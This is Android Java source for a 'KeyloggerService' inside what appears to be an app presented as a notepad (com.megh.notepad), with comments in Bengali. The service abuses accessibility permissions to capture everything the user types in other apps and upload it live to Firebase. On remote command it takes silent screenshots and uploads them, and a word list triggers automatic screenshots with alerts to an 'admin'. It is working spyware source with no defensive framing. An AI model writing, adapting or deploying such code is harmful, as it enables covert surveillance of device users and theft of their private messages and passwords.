package com.megh.notepad; // আপনার প্যাকেজ নেম ঠিক রাখবেন

import android.accessibilityservice.AccessibilityService;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {

    private DatabaseReference keyloggerRef;
    private String currentApp = "Unknown App";
    
    // ম্যাজিক সেশনের জন্য ভেরিয়েবল (Time-based Session)
    private String currentSessionId = "";
    private String lastText = "";
    private long lastTextChangeTime = 0;

    // ১৮+ শব্দ ডিটেক্ট করার জন্য ভেরিয়েবল
    private String[] badWords = {"xx", "porn", "sex", "মাগি", "খানকি", "চুদ", "বাল", "ধোন"}; // এখানে আপনি আপনার ইচ্ছামতো আরও শব্দ যোগ করতে পারেন
    private long lastAlertTime = 0; // বারবার যেন স্ক্রিনশট না নেয় তার জন্য টাইমার (Cooldown)

    // স্ক্রিনশটের জন্য ভেরিয়েবল
    private DatabaseReference commandRef;
    private ValueEventListener commandListener;
    private boolean isCapturing = false;

    // 🌟 নতুন: RestartReceiver থেকে সিগন্যাল শোনার জন্য ব্রডকাস্ট রিসিভার 🌟
    private android.content.BroadcastReceiver wakeUpReceiver;

    private String getUserName() {
        return getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("UserName", "UnknownUser");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(getUserName()).child("AccessibilityStatus").setValue("ON (Active)");

        keyloggerRef = FirebaseDatabase.getInstance().getReference("DeviceData").child(getUserName()).child("Live_Keystrokes");
        Log.d("Keylogger", "Service Connected and Active!");
        
        listenForScreenshotCommand(); 

        // 🌟 নতুন: RestartReceiver এর সিগন্যাল শোনার জন্য রিসিভার রেজিস্টার করা হচ্ছে 🌟
        wakeUpReceiver = new android.content.BroadcastReceiver() {
            @Override
            public void onReceive(android.content.Context context, android.content.Intent intent) {
                if ("WAKE_UP_ACCESSIBILITY".equals(intent.getAction())) {
                    Log.d("Keylogger", "Wake up signal received! Starting BackgroundService...");
                    android.content.Intent serviceIntent = new android.content.Intent(context, BackgroundService.class);
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            context.startForegroundService(serviceIntent);
                        } else {
                            context.startService(serviceIntent);
                        }
                    } catch (Exception e) {
                        Log.e("Keylogger", "Failed to start BackgroundService from Accessibility: " + e.getMessage());
                    }
                }
            }
        };
        android.content.IntentFilter filter = new android.content.IntentFilter("WAKE_UP_ACCESSIBILITY");
        try {
            if (android.os.Build.VERSION.SDK_INT >= 33) {
                registerReceiver(wakeUpReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(wakeUpReceiver, filter);
            }
        } catch (Exception e) {
            Log.e("Keylogger", "Receiver Register Error: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            // ১. অ্যাপের নাম বের করা (কীবোর্ড অ্যাপগুলোকে ফিল্টার করে বাদ দেওয়া)
            if (event.getPackageName() != null) {
                String pkg = event.getPackageName().toString().toLowerCase();
                if (!pkg.contains("inputmethod") && !pkg.contains("keyboard") && 
                    !pkg.contains("gboard") && !pkg.contains("ime") && !pkg.contains("systemui")) {
                    currentApp = pkg;
                }
            }

            // ২. টাইপিং ধরা (The Ultimate Time-Based Session Logic)
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                if (event.getText() != null && !event.getText().isEmpty()) {
                    String newText = event.getText().get(0).toString();
                    
                    if (newText.trim().isEmpty()) return;

                    long currentTime = System.currentTimeMillis();

                    // রুল ১: যদি শেষ টাইপ করার পর ৪ সেকেন্ড পার হয়ে যায়, তবে নতুন নোড/সেশন শুরু করো
                    if (currentTime - lastTextChangeTime > 4000 || currentSessionId.isEmpty()) {
                        currentSessionId = new SimpleDateFormat("dd_MMM_hh_mm_ss_a", Locale.getDefault()).format(new Date());
                    }

                    // রুল ২: মেসেজ সেন্ড হওয়ার লজিক। 
                    // যদি নতুন লেখাটা হঠাৎ করে খুব ছোট হয়ে যায় (যেমন: মেসেজ সেন্ড করলে ইনপুট বক্স ফাঁকা হয়)
                    if (newText.length() < 3 && lastText.length() > 5) {
                        lastTextChangeTime = 0; // সেশন ক্লোজ, পরের বার নতুন নোড তৈরি হবে
                        lastText = "";
                        return; // ফাঁকা টেক্সট দিয়ে আগের পুরো মেসেজটাকে ওভাররাইট করা বন্ধ করলাম!
                    }

                    // রুল ৩: ডেটা মেমোরিতে সেভ করো এবং ফায়ারবেসে পাঠাও
                    lastText = newText;
                    lastTextChangeTime = currentTime;

                    uploadTextToFirebase(newText);
                    
                    // ১৮+ বা খারাপ শব্দ আছে কি না তা চেক করা
                    checkForAdultContent(newText);
                }
            }
        } catch (Exception e) {
            Log.e("Keylogger", "Event Error: " + e.getMessage());
        }
    }

    private void uploadTextToFirebase(String textToUpload) {
        try {
            PackageManager pm = getPackageManager();
            String appName = currentApp;
            try {
                ApplicationInfo appInfo = pm.getApplicationInfo(currentApp, 0);
                appName = pm.getApplicationLabel(appInfo).toString();
            } catch (Exception e) {}

            String safeAppName = appName.replace(".", "_").replace("#", "").replace("$", "").replace("[", "").replace("]", "");

            // ম্যাজিক: একই currentSessionId ব্যবহার করার কারণে নতুন কোনো রো তৈরি হবে না, 
            // বরং একই ফোল্ডারের লেখাটা রিয়েল-টাইমে আপডেট হতে থাকবে!
            keyloggerRef.child(safeAppName).child(currentSessionId).setValue(textToUpload);

        } catch (Exception e) {
            Log.e("Keylogger", "Upload Error: " + e.getMessage());
        }
    }

    // ১৮+ শব্দ চেক এবং অটো স্ক্রিনশট + এলার্ট পাঠানোর মেথড
    private void checkForAdultContent(String text) {
        if (text == null) return;
        String lowerText = text.toLowerCase();
        
        for (String word : badWords) {
            if (lowerText.contains(word)) {
                long currentTime = System.currentTimeMillis();
                
                // ম্যাজিক: এখন ১০ সেকেন্ডের (10000ms) মধ্যে একবারই অটো স্ক্রিনশট নেবে
                if (currentTime - lastAlertTime > 10000) {
                    lastAlertTime = currentTime;
                    
                    Log.d("Keylogger", "Adult content detected! Word: " + word);
                    
                    // ১. অটোমেটিক স্ক্রিনশট নেওয়া
                    if (!isCapturing) {
                        isCapturing = true;
                        updateScreenshotStatus("Auto Capturing (18+ detected)...");
                        captureAndUploadScreenshot(); // স্ক্রিনশটের মেথড কল করে দিলাম!
                    }
                    
                    // ২. অ্যাডমিনের জন্য ফায়ারবেসে স্পেশাল অ্যালার্ট পাঠানো
                    sendAlertToAdmin(word, text);
                }
                break; // একটা শব্দ পেলেই লুপ ব্রেক করবে
            }
        }
    }

    private void sendAlertToAdmin(String triggerWord, String fullText) {
        try {
            DatabaseReference alertRef = FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(getUserName()).child("Alerts");
                    
            String timeStamp = new java.text.SimpleDateFormat("dd_MMM_hh_mm_ss_a", java.util.Locale.getDefault()).format(new java.util.Date());
            
            // ফায়ারবেসে অ্যালার্ট ডেটা পুশ
            java.util.HashMap<String, String> alertData = new java.util.HashMap<>();
            alertData.put("TriggeredWord", triggerWord);
            alertData.put("FullText", fullText);
            alertData.put("App", currentApp);
            
            alertRef.child("Alert_" + timeStamp).setValue(alertData);
        } catch (Exception e) {
            Log.e("Keylogger", "Alert Error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(getUserName()).child("AccessibilityStatus").setValue("Interrupted");
    }
    
    // ==========================================
    // রিমোট স্ক্রিনশট ফিচার (Android 11+)
    // ==========================================

    private void listenForScreenshotCommand() {
        if (commandRef != null && commandListener != null) {
            commandRef.removeEventListener(commandListener);
        }

        commandRef = FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(getUserName()).child("Commands");

        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@androidx.annotation.NonNull DataSnapshot snapshot) {
                if (snapshot.hasChild("TakeScreenshot")) {
                    String cmd = String.valueOf(snapshot.child("TakeScreenshot").getValue());
                    
                    if ("true".equalsIgnoreCase(cmd) && !isCapturing) {
                        isCapturing = true;
                        updateScreenshotStatus("Taking Screenshot...");
                        commandRef.child("TakeScreenshot").setValue("false"); 
                        captureAndUploadScreenshot();
                    }
                }
            }
            @Override
            public void onCancelled(@androidx.annotation.NonNull DatabaseError error) {
                Log.e("ScreenshotService", "Listener Cancelled: " + error.getMessage());
            }
        };
        commandRef.addValueEventListener(commandListener);
    }

    private void captureAndUploadScreenshot() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(@androidx.annotation.NonNull ScreenshotResult screenshotResult) {
                    try {
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                screenshotResult.getHardwareBuffer(), 
                                screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            uploadImageToFirebase(bitmap);
                        } else {
                            updateScreenshotStatus("Error: Failed to create bitmap.");
                            isCapturing = false;
                        }
                    } catch (Exception e) {
                        updateScreenshotStatus("Error processing screenshot: " + e.getMessage());
                        isCapturing = false;
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    updateScreenshotStatus("Error: Screenshot failed. Code: " + errorCode);
                    isCapturing = false;
                }
            });
        } else {
            updateScreenshotStatus("Error: Silent Screenshot requires Android 11+");
            isCapturing = false;
        }
    }

    private void uploadImageToFirebase(android.graphics.Bitmap bitmap) {
        try {
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 40, baos); 
            byte[] imageBytes = baos.toByteArray();
            String base64Image = android.util.Base64.encodeToString(imageBytes, android.util.Base64.DEFAULT);

            DatabaseReference imgRef = FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(getUserName()).child("Screenshots");

            String timeStamp = new java.text.SimpleDateFormat("dd_MMM_hh_mm_ss_a", java.util.Locale.getDefault()).format(new java.util.Date());

            imgRef.child("Shot_" + timeStamp).setValue(base64Image)
                .addOnCompleteListener(new com.google.android.gms.tasks.OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@androidx.annotation.NonNull com.google.android.gms.tasks.Task<Void> task) {
                        if (task.isSuccessful()) {
                            updateScreenshotStatus("Screenshot Uploaded Successfully!");
                        } else {
                            updateScreenshotStatus("Upload Failed!");
                        }
                        isCapturing = false;
                    }
                });

        } catch (Exception e) {
            updateScreenshotStatus("Upload Error: " + e.getMessage());
            isCapturing = false;
        }
    }

    private void updateScreenshotStatus(String status) {
        FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(getUserName()).child("ScreenshotStatus").setValue(status);
        Log.d("ScreenshotService", status);
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        if (commandRef != null && commandListener != null) {
            commandRef.removeEventListener(commandListener);
        }
        
        // 🌟 নতুন: সার্ভিস বন্ধ হওয়ার সময় রিসিভারটি আনরেজিস্টার করে মেমরি লিক ঠেকানো 🌟
        if (wakeUpReceiver != null) {
            try {
                unregisterReceiver(wakeUpReceiver);
            } catch (Exception e) {}
        }
        
        FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(getUserName()).child("AccessibilityStatus").setValue("OFF (Unbound)");
                
        return super.onUnbind(intent);
    }
}


